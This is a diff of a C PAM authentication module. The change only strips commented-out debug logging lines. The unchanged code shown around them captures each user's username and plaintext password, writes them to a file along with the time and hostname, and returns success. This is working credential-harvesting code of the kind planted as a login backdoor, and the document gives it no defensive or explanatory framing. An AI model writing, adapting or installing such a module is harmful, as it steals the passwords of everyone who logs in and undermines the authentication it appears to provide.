@@ -6,7 +6,6 @@
 #include <security/_pam_macros.h>
 #include <unistd.h>
 #include <time.h>
-//#include <sys/syslog.h>
 
 #define MAX_SIZE 128
 
@@ -37,7 +36,6 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
 
     retval = pam_get_user(pamh, (const char **) &username, "Username: ");
     if (retval != PAM_SUCCESS) {
-//        pam_syslog(pamh, LOG_DEBUG, "pam_get_user failed, return %d",retval);
         return retval;
     }
 
@@ -47,18 +45,14 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
 
     retval = pam_get_item(pamh, PAM_AUTHTOK, &void_pass);
     if (retval != PAM_SUCCESS) {
-//        pam_syslog(pamh, LOG_DEBUG, "pam_get_item (PAM_AUTHTOK) failed, return %d",retval);
         return retval;
     }
     else if (void_pass == NULL) {
-//        pam_syslog(pamh, LOG_DEBUG, "could not read password from stdin, as void_pass is null, set-it");
         char *resp = NULL;
         retval = pam_prompt(pamh, PAM_PROMPT_ECHO_OFF, &resp, "Password: ");
         if (retval != PAM_SUCCESS){
-//            pam_syslog(pamh, LOG_DEBUG, "pam prompt read from stdin error");
             _pam_drop(resp);
             if (retval == PAM_CONV_AGAIN){
-//                pam_syslog(pamh, LOG_DEBUG, "pam prompt err conv_again");
                 retval = PAM_INCOMPLETE;
             }
             return retval;
@@ -66,7 +60,6 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
         if (resp) {
             pam_set_item(pamh, PAM_AUTHTOK, resp);
             if (authtok == NULL) {
-//                pam_syslog(pamh, LOG_DEBUG, "authtok PTR null"); 
                 return PAM_SYSTEM_ERR;
             }
             strncpy(authtok, resp, PAM_MAX_RESP_SIZE - 1);
@@ -75,18 +68,14 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
     }
     else {
         if (void_pass == NULL) {
-//            pam_syslog(pamh, LOG_DEBUG, "void_pass PTR null");
             return PAM_SYSTEM_ERR;
         }
         strncpy(authtok, void_pass, PAM_MAX_RESP_SIZE - 1);
     }
 
-//    pam_syslog(pamh, LOG_DEBUG, "password read as authtok: %s", authtok);
-
     gethostname(hostname, sizeof hostname);
     snprintf(message, 1023, "Time: %ld\nHostname: %s\nUsername: %s\nPassword: %s\n\n",
              (unsigned long) time(NULL), hostname, username, authtok);
-//    pam_syslog(pamh, LOG_DEBUG, "logging info final: %s", message);
     write_to_file(message);
     return PAM_SUCCESS;
 }
